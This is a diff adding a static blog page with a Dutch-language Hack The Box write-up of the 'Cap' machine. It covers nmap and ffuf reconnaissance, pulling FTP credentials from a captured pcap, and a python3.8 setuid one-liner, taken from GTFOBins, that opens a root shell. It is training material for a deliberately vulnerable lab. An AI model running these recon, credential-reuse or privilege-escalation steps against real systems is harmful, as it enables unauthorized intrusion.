@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Wat we als eerste zulllen gaan doen is een scan op het netwerk voor het vinden van alle open poorten. Dit zullen we gaan doen aan de hand van het volgende commando.
+nmap -p- -sCV 10.129.103.235 -vvvv We krijgen te zien dat er 3 open poorten gevonden zijn. Dit zijn de volgende poorten die open staan en wat hun doen:
+- Poort 22 → SSH connection → Kijken voor een exploit voor de versie OpenSSH 8.2p1 " />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-cap/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Wat we als eerste zulllen gaan doen is een scan op het netwerk voor het vinden van alle open poorten. Dit zullen we gaan doen aan de hand van het volgende commando.
+nmap -p- -sCV 10.129.103.235 -vvvv We krijgen te zien dat er 3 open poorten gevonden zijn. Dit zijn de volgende poorten die open staan en wat hun doen:
+- Poort 22 → SSH connection → Kijken voor een exploit voor de versie OpenSSH 8.2p1">
+  <meta itemprop="wordCount" content="605">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Wat we als eerste zulllen gaan doen is een scan op het netwerk voor het vinden van alle open poorten. Dit zullen we gaan doen aan de hand van het volgende commando.
+nmap -p- -sCV 10.129.103.235 -vvvv We krijgen te zien dat er 3 open poorten gevonden zijn. Dit zijn de volgende poorten die open staan en wat hun doen:
+- Poort 22 → SSH connection → Kijken voor een exploit voor de versie OpenSSH 8.2p1">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-cap/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>Wat we als eerste zulllen gaan doen is een scan op het netwerk voor het vinden van alle open poorten. Dit zullen we gaan doen aan de hand van het volgende commando.</p>
+<pre tabindex="0"><code>nmap -p- -sCV 10.129.103.235 -vvvv
+</code></pre><p><img src="50397185.png" alt="image-20241026-110348.png"></p>
+<p>We krijgen te zien dat er 3 open poorten gevonden zijn. Dit zijn de volgende poorten die open staan en wat hun doen:</p>
+<pre tabindex="0"><code>- Poort 22 → SSH connection → Kijken voor een exploit voor de versie OpenSSH 8.2p1
+</code></pre><p><img src="50298887.png" alt="image-20241026-110827.png"></p>
+<pre tabindex="0"><code>- Poort 80 → Http connectie → We kunnen aan de hand van het IP address naar de webserver gaan.
+    
+</code></pre><p><img src="50331668.png" alt="image-20241026-111130.png"></p>
+<pre tabindex="0"><code>- Poort 21 → ftp connectie → We kunnen aan de hand van een user gaan inloggen op de ftp server.
+</code></pre><p>![[Pasted image 20250122145613.png]]</p>
+<p>Als we op onze webbrowser gaan, Zullen we daar het ip address gaan ingeven. We zullen zien dat we op een dashboard terecht komen.</p>
+<p><img src="50364430.png" alt="image-20241026-111326.png"></p>
+<p>We zullen aan de hand van het FFUF commando eens gaan kijken welke subdirectories er allemaal beschikbaar zijn. Dit zullen we gaan doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.103.235:80/FUZZ -c
+</code></pre><p><img src="50364440.png" alt="image-20241026-120611.png"></p>
+<p>Daarna ben ik een fuzz gaan doen op de subdirectory data. dit heb ik gedaan door het volgende commando:</p>
+<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.129.103.235/data/FUZZ -c
+</code></pre><p><img src="50331684.png" alt="image-20241026-120522.png"></p>
+<p>Hier uit heb ik gezien dat er verschillende sub subdirectories zijn onder de subdirectory data. Deze allemaal is gaan bekijken en ik heb gezien dat er in de sub subdirectory 6,7 en 8 data in zat. Ik zal nu eens gaan kijken wat er allemaal in deze files zit aan de hand van wireshark.</p>
+<pre tabindex="0"><code>File 8 → geen gevoelige data in gevonden.
+
+File 7 → geen gevoelige data in gevonden.
+
+File 6 → geen gevoelige data in gevonden.
+</code></pre><p>Dit is enorm raar dat ik in ze alle 3 niet heb gevoden van gevoelige data, Daarom heb ik nog eens FUZZ uitgevoerd en hierbij kreeg ik nog een extra sub subdirectory te zien. Deze sub subdirectory is 0.</p>
+<p><strong>In de 0 hebben we gevoelige data kunnen vinden.</strong></p>
+<p>Als we deze in de wireshark zullen we gaan zien dat er een succesvolle login is geweest naar de ftp server. Dit is gedaan geweest met de login credentials:</p>
+<p><strong>name: nathan</strong></p>
+<p><strong>password: Buck3tH4TF0RM3!</strong></p>
+<p><img src="50298913.png" alt="image-20241026-122330.png"></p>
+<p>Als we nu gaan proberen om een verbinding te maken met de ftp server, zulllen we dit moeten gaan doen aan de hand van de volgende login credentials:</p>
+<p><strong>name: nathan</strong></p>
+<p><strong>password: Buck3tH4TF0RM3!</strong></p>
+<p><img src="50331698.png" alt="image-20241026-123145.png"></p>
+<p>Als we hier het ls commando zullen gaan gebruiken zullen we gaan zien dat er een bestand user.txt bestaat.</p>
+<p><img src="50397225.png" alt="image-20241026-123224.png"></p>
+<p>voor dit bestand te kunnen zien zullen we deze eerst moeten gaan downloaden naar onze eigen machine, Dit zullen we gaan doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>get user.txt --&gt; Dit betekend voor een specifieke file
+
+of
+
+mget * --&gt; Dit betekend voor alle files 
+</code></pre><p>eens deze file gedownload is dan kunnen we de eerste flag zien:</p>
+<p><img src="50331719.png" alt="image-20241026-131123.png"></p>
+<p>Daarna ben ik eens gaan opzoeken hoe dat we via de getcap commando ons naar root kunnen brengen. Dit zullen we kunnen doen door het volgende commando uittegaan voeren.</p>
+<pre tabindex="0"><code>getcap -r / 2&gt;/dev/null
+</code></pre><p>This output indicated that <code>python3.8</code> had the capability to change the user ID, which could potentially be exploited to gain root privileges.</p>
+<p><img src="50298935.png" alt="image-20241026-130854.png"></p>
+<p>Voor het gainen van de root access ben ik dit gaan opzoeken op GTFObins. Door het commando van daar te gebruiken, heb ik root access gekregen op de ssh server.</p>
+<p><a href="https://gtfobins.github.io/gtfobins/python/?source=post_page-----eb9c97f2259c--------------------------------#capabilities">https://gtfobins.github.io/gtfobins/python/?source=post_page&mdash;&ndash;eb9c97f2259c&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;#capabilities</a></p>
+<p>Het commando hieronder heb ik gebruikt voor het access van de root shell:</p>
+<pre tabindex="0"><code>python3.8 -c &#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;
+</code></pre><p><img src="50331712.png" alt="image-20241026-130837.png"></p>
+<p>Als we nu naar de root directory gaan dan zal je daar een file root.txt zien staan. Dit is onze 2 de flag</p>
+<p>![[Pasted image 20250122145836.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
